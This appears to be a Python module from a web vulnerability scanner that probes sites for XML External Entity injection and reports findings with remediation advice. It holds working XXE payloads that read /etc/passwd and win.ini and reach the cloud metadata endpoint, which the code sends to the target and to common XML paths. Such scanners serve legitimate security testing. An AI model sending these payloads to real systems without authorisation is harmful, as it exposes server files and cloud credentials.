#!/usr/bin/env python3
"""
WebHunter - XXE Injection Scanner
"""

from core.logger import HunterLogger
from core.engine import Vulnerability
from core.utils import make_request, get_headers, extract_forms, delay

log = HunterLogger("XXE")


class XXEScanner:
    """XML External Entity (XXE) Injection scanner"""

    def __init__(self, target, engine):
        self.target = target
        self.engine = engine
        self.findings = []

        self.xxe_payloads = [
            # Basic XXE to read /etc/passwd
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            # Windows
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
            # Parameter entity
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>',
            # SSRF via XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            # Billion laughs (DoS detection)
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><root>&lol2;</root>',
        ]

    def scan(self):
        """Run XXE scan"""
        log.info(f"Testing XXE Injection on {self.target.url}")

        self._test_content_type()
        self._test_xml_endpoints()
        self._test_file_upload_xxe()

        return self.findings

    def _test_content_type(self):
        """Test if application accepts XML content type"""
        headers = get_headers({"Content-Type": "application/xml"})

        for payload in self.xxe_payloads[:3]:
            r = make_request(self.target.url, method="POST", data=payload, headers=headers)
            if r:
                indicators = ["root:", "/bin/bash", "[fonts]", "ami-id",
                              "meta-data", "instance-type"]
                for ind in indicators:
                    if ind in r.text:
                        vuln = Vulnerability(
                            title="XXE Injection",
                            severity="CRITICAL",
                            description="XML External Entity injection allows reading server files",
                            url=self.target.url,
                            payload=payload[:100],
                            evidence=ind,
                            remediation="Disable DTD processing. Use JSON instead of XML.",
                            owasp_category="A03 - Injection",
                            module="XXE Scanner"
                        )
                        self.engine.add_vulnerability(vuln)
                        self.findings.append(vuln)
                        return
            delay()

    def _test_xml_endpoints(self):
        """Test common XML-accepting endpoints"""
        xml_paths = [
            "/api/xml", "/xmlrpc.php", "/soap", "/wsdl",
            "/api/upload", "/import", "/api/import",
            "/api/v1/data", "/feed", "/rss",
        ]

        headers = get_headers({"Content-Type": "text/xml"})

        for path in xml_paths:
            url = f"{self.target.url}{path}"
            for payload in self.xxe_payloads[:2]:
                r = make_request(url, method="POST", data=payload, headers=headers)
                if r:
                    if "root:" in r.text or "[fonts]" in r.text:
                        vuln = Vulnerability(
                            title=f"XXE at Endpoint: {path}",
                            severity="CRITICAL",
                            description=f"XXE injection at XML endpoint {url}",
                            url=url,
                            payload=payload[:100],
                            evidence=r.text[:200],
                            remediation="Disable external entity processing in XML parser.",
                            owasp_category="A03 - Injection",
                            module="XXE Scanner"
                        )
                        self.engine.add_vulnerability(vuln)
                        self.findings.append(vuln)
                        return

                    # Check if XML is being parsed (error messages)
                    xml_errors = ["xml parsing error", "not well-formed",
                                  "xml syntax", "saxparseexception"]
                    for err in xml_errors:
                        if err in r.text.lower():
                            vuln = Vulnerability(
                                title=f"XML Parser Detected at: {path}",
                                severity="MEDIUM",
                                description=f"XML parser detected - potential XXE target",
                                url=url,
                                evidence=err,
                                remediation="Ensure XXE protection is enabled in XML parser.",
                                owasp_category="A03 - Injection",
                                module="XXE Scanner"
                            )
                            self.engine.add_vulnerability(vuln)
                            self.findings.append(vuln)
                            break
            delay()

    def _test_file_upload_xxe(self):
        """Test for XXE via file upload (SVG, DOCX, etc.)"""
        svg_xxe = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text x="10" y="20">&xxe;</text>
</svg>'''

        upload_paths = ["/upload", "/api/upload", "/file/upload",
                        "/import", "/api/import"]

        for path in upload_paths:
            url = f"{self.target.url}{path}"
            r = make_request(url)
            if r and r.status_code == 200:
                if any(word in r.text.lower() for word in ["upload", "file", "import"]):
                    log.info(f"Upload endpoint found: {url} - test manually for XXE via file upload")

        return self.findings
